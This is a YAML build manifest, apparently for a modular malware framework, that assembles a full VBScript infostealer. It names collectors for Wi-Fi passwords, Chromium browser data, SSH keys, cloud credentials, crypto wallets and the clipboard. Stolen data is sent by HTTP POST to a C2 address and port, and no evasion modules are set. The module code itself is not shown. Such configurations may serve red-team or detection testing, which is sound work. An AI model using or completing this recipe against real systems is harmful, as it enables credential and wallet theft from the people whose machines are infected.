name: vbs_infostealer_full
description: Full VBScript infostealer with all collectors, HTTP POST exfil
format: vbscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo
  - collectors/processes
  - collectors/network
  - collectors/installed_software
  - collectors/scheduled_tasks
  - collectors/env_vars
  - collectors/drives
  - collectors/recent_files
  - collectors/startup_items
  - collectors/security_products
  - collectors/wifi_passwords
  - collectors/browser_chromium
  - collectors/ssh_keys
  - collectors/cloud_creds
  - collectors/crypto_wallets
  - collectors/clipboard

exfil: exfil/http_post
arch: arch/sequential

evasion: []

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
